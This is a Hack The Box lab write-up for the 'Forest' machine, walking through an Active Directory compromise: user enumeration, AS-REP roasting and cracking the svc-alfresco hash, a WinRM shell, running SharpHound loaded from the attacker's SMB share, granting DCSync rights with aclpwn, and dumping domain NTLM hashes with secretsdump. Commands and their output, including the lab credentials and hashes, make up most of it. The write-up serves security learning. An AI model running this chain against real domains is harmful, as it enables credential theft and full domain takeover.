---
layout: single
title: Forest - Hack The Box
excerpt: "Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieve and cracked the hash for the service account I used aclpwn to automate the attack path and give myself DCsync rights to the domain."
date: 2020-03-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-forest/forest_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ad
  - kerberos
  - bloodhound
  - dcsync
  - aclpwn
---

![](/assets/images/htb-writeup-forest/forest_logo.png)

Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieved and cracked the hash for the service account I used aclpwn to automate the attack path and give myself DCsync rights to the domain.

## Summary

- The service account `svc-alfresco` does not require kerberos preauthentication so we can retrieve and crack the hash offline  
- After running Bloodhound on the machine, we find that we have WriteDACL access on the domain
- We can give ourselved DCSync rights, recover the administrator NTLM hash and psexec to get an administrator shell

## Portscan

```
root@kali:~/htb/forest# nmap -p- -T4 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-12 15:01 EDT
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.041s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49697/tcp open  unknown
```

## Enumerating domain users on the machine

NULL sessions are allowed so we can get a list of users through the RPC client.

The `svc-alfresco` user is probably a service account based on the name.

```
root@kali:~/htb/forest# enum4linux 10.10.10.161
[...]
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## Cracking the TGT for the service account

When we query the target domain for users with 'Do not require Kerberos preauthentication' set, we find that `svc-alfresco` is not configured with pre-authentication so its TGT will be returned to us encrypted with its password. Similar to kerberoasting, we can brute force the hash offline.

```
root@kali:~/htb/forest# GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:048f9eeb67ab94be9e4d8fa1da1020[...]6994e733284cc75dc1e3fff447a5d69b064df4fc5967c96b023a5
```

```
root@kali:~/htb/forest# john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2019-10-12 19:52) 0.1481g/s 605297p/s 605297c/s 605297C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We found the credentials for the service account: `svc-alfresco` / `s3rvice`. This service account is allowed to connect to the server with WinRM.

```
root@kali:~/htb/forest# evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161

Info: Starting Evil-WinRM shell v1.6

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\desktop\user.txt
e5e4e47[...]
```

## AD recon with Bloodhound

Using the Bloodhound ingestor, we can collect the data from Active Directory:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> powershell -ep bypass -command "import-module \\10.10.14.7\test\SharpHound.ps1; invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice"
Initializing BloodHound at 5:07 PM on 10/12/2019
Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
Starting Enumeration for htb.local
Status: 123 objects enumerated (+123 123/s --- Using 117 MB RAM )
Finished enumeration for htb.local in 00:00:01.0088043
1 hosts failed ping. 0 hosts timedout.

Compressing data to C:\Users\svc-alfresco\Documents\20191012170734_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> copy 20191012170734_BloodHound.zip \\10.10.14.7\test
```

After transferring the zip file to our Kali VM, we load the data in Bloodhound and check for the shortest path to domain admin. As shown below, the `svc-alfresco` user has `GenericAll` rights on the `Exchange Windows Permissions` group so we can add this user to the group. Next, the `WriteDacl` rights allows us to give DCsync rights to our compromised user and retrieve the NTLM hashes for all users on the domain.

![](/assets/images/htb-writeup-forest/bloodhound1.png)

### Privesc with DCSync

To exploit the ACL path automatically we can use [aclpwn](https://github.com/fox-it/aclpwn.py):

```
root@kali:~/openvpn# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dp bloodhound -du neo4j --server 10.10.10.161 -u svc-alfresco -sp s3rvice -p s3rvice
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
Please choose a path [0-1] 0
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user svc-alfresco to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Switching context to svc-alfresco
[+] Done switching context
[-] Modifying domain DACL to give DCSync rights to svc-alfresco
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191013-084938.restore
```

Now that we have the DCsync rights, we can use secretsdump.py to perform DCsync and get all the hashes.

```
root@kali:~/openvpn# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[...]
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
[...]
[*] Cleaning up...
```

Now that we have the administrator's hash we can use psexec to log in.

![](/assets/images/htb-writeup-forest/root.png)